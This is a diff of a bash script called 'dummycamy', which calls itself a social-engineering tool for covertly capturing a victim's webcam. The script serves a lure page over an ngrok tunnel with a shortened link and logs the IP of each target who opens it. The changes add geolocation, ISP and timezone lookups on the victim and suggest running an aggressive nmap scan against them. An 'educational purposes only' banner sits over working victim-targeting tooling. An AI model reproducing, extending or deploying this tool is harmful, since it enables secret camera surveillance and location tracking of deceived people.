@@ -1,25 +1,23 @@
 #!/bin/bash
-# dummycamy v2.1
+# dummycamy v3.0
 # Mod by:Amine Boutouil
-
+version="v3.0"
 clear
 
 trap 'printf "\n";stop' 2
 
 banner() {
 
-printf "\e[1;92m      ____                                          \e[0m\n" 
-printf "\e[1;92m     |    \  |     | |\__/| |\__/| \   /            \e[0m\n" 
-printf "\e[1;92m     |    /  |     | |    | |    |  \ /             \e[0m\n" 
-printf "\e[1;92m     |___/   |_____| |    | |    |   |              \e[0m\n" 
-printf "\e[1;92m                         ʙʏ ᴀᴍɪɴᴇ ʙᴏᴜᴛᴏᴜɪʟ          \e[0m\n" 
-printf "\e[1;92m                  ____   _____                      \e[0m\n" 
-printf "\e[1;92m                 |      |     | |\__/|  \   /       \e[0m\n" 
-printf "\e[1;92m                 |      |_____| |    |   \ /        \e[0m\n" 
-printf "\e[1;92m                 |____  |     | |    |    |         \e[0m\n" 
-printf "\n"
+printf "\e[1;92m 
+ ____  _   _ __  __ __  ____   __   ____    _    __  ____   __
+|  _ \| | | |  \/  |  \/  \ \ / /  / ___|  / \  |  \/  \ \ / /
+| | | | | | | |\/| | |\/| |\ V /  | |     / _ \ | |\/| |\ V / 
+| |_| | |_| | |  | | |  | | | |   | |___ / ___ \| |  | | | |  
+|____/ \___/|_|  |_|_|  |_| |_|    \____/_/   \_\_|  |_| |_|  \e[0m\n
+\e[1;33m                         ʙʏ ᴀᴍɪɴᴇ ʙᴏᴜᴛᴏᴜɪʟ          \e[0m\n
+"
 
-printf " \e[1;77m SHELL by (Amine Boutouil) https://github.com/Amine-Boutouil \e[0m \n"
+printf "\e[1;77m For educational purposes only, You and ONLY You are responsible for your actions!! \e[0m"
 
 
 printf "\n"
@@ -57,10 +55,26 @@ command -v php > /dev/null 2>&1 || { echo >&2 "php is required but not installed
 catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+country=$(curl -s ifconfig.co/country?ip=$ip)
+country_iso=$(curl -s ifconfig.co/country-iso?ip=$ip)
+city=$(curl -s ifconfig.co/city?ip=$ip)
+isp=$(curl -s ipinfo.io/$ip/org)
+region_code=$(curl -s ifconfig.co/json | jq -r '.region_code')
+region_name=$(curl -s ifconfig.co/json | jq -r '.region_name')
+timezone=$(curl -s ipinfo.io/$ip/timezone)
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" $country
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Country Code:\e[0m\e[1;77m %s\e[0m\n" $country_iso
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" $city
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Region Code:\e[0m\e[1;77m %s\e[0m\n" $region_name
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Region Code:\e[0m\e[1;77m %s\e[0m\n" $region_code
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" $timezone
+printf "\033[1;31m[\e[0m\e[1;77m *** \e[0m\033[1;31m] To know more use the command : \e[1;37m nmap -A "$ip
 cat ip.txt >> saved.ip.txt
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for Data,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 
 
 }
@@ -73,7 +87,7 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Woo Hoo !! Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Yeeey !! Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -92,41 +106,12 @@ done
 }
 
 
-server() {
-
-command -v ssh > /dev/null 2>&1 || { echo >&2 "ssh is required but not installed. Install it first..."; exit 1; }
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-
-if [[ $subdomain_resp == true ]]; then
-
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
-
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
-
-sleep 8
-fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
-sleep 3
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
-
-}
-
 
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https:[^"]*.ngrok.io')
 sed 's+forwarding_link+'$link'+g' dummycamy.html > website.html
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+# sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
 }
@@ -149,6 +134,9 @@ if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Please Enter Your Ngrok Authtoken:\e[0m\e[1;77m %s\e[0m\n"
+read auth_key
+./ngrok authtoken $auth_key
 else
 printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
@@ -160,13 +148,16 @@ if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Please Enter Your Ngrok Authtoken:\e[0m\e[1;77m %s\e[0m\n"
+read auth_key
+./ngrok authtoken $auth_key
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
 exit 1
 fi
 fi
 fi
-
+printf "\e[0m\033[1;31m ** Remember! Use it with caution ** \e[1;37m\n"
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
@@ -175,8 +166,10 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https:[^"]*.ngrok.io')
-
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m $link" 
+printf "\n" 
+#link shortening
+printf "\e[1;92m[\e[0m*\e[1;92m] Short link:\e[0m\e[1;77m %s\e[0m $(curl -s -f https://is.gd/create.php?format=simple\&url=$link)"  
 
 payload_ngrok
 checkfound
@@ -188,55 +181,39 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server -eq 1 ]]; then
+printf "1) Start the MAGIC\n"
+printf "2) About DummyCamy \n"
+printf "3) About The Author \n"
+printf "4) Quit \n"
 
-command -v php > /dev/null 2>&1 || { echo >&2 "ssh is required but not installed. Install it first..."; exit 1; }
-start
-
-elif [[ $option_server -eq 2 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m' option
+if [[ $option -eq 1 ]]; then
+clear
+banner
 ngrok_server
+elif [[ $option -eq 2 ]]; then
+printf "DummyCamy is a Social engineering tool to gain access to user's web camera using Ajax and PHP, many devices does not have a webcam operating led so it can work hidden in the background.\n
+Although the newest PCs have a small led next to the camera that works automatically when the cam is being used.\n"
+printf "Version : $version\n\n"
+printf "Developer : Amine Boutouil\n"
+printf "Website : https://blog.boutouil.me/tools/DummyCamy ~ https://github.com/amine-boutouil/dummycamy\n\n"
+start1
+elif [[ $option -eq 3 ]]; then
+printf "This Tool was made by Amine Boutouil, Redirecting to his Portfolio in 2sec...\n\n"
+open https://boutouil.me
+sleep 2
+start1
+elif [[ $option -eq 4 ]]; then
+printf "Bye Bye! to the next time ^~^"
+sleep 1
+exit
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
+banner
 start1
 fi
-
-}
-
-
-payload() {
-
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-
-sed 's+forwarding_link+'$send_link'+g' dummycamy.html > website.html
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-
-
-}
-
-start() {
-
-default_choose_sub="Y"
-default_subdomain="dummycamy$RANDOM"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-server
-payload
-checkfound
 
 }
 
